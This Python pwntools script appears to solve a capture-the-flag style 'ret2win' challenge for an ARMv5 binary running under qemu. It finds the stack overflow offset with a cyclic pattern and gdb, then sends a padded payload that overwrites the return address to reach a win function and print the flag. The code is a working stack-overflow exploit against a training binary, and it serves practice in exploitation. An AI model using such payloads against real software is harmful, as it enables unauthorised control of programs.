from pwn import *
from time import sleep

#
# Context
#

e = context.binary = ELF('ret2win_armv5')

#
# ROP
#

target = 0x000105ec

#
# Find Offset
#

# launch qemu with payload
"""
python3 -c 'from pwn import *; print(cyclic(0x38))' | qemu-arm -L /usr/arm-linux-gnueabihf -g <port> ./ret2win_armv5
"""

# gdb-multiarch script
"""
symbol-file ret2win_armv5
set arch arm
target remote :<port>

b *pwnme+100
ni
i r pc

Output: 616a6160
Warning: The output bytes are offset by -1
"""

# calculate offset
"""
python3 -c 'from pwn import *; print(cyclic_find(bytes.fromhex(hex(int(input(), 16) + 1)[2:])) + 1)'
"""

offset = 36
info(f'Offset: {offset}')

#
# Exploit
#

payload  = b''
payload += b'A' * offset
payload += p32(target-4)

with open('payload', 'wb') as fout:
    fout.write(payload)

io = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabihf', './ret2win_armv5'])
io.sendlineafter(b'> ', payload)
info(io.recvuntil(b'}\n').decode())

io.close()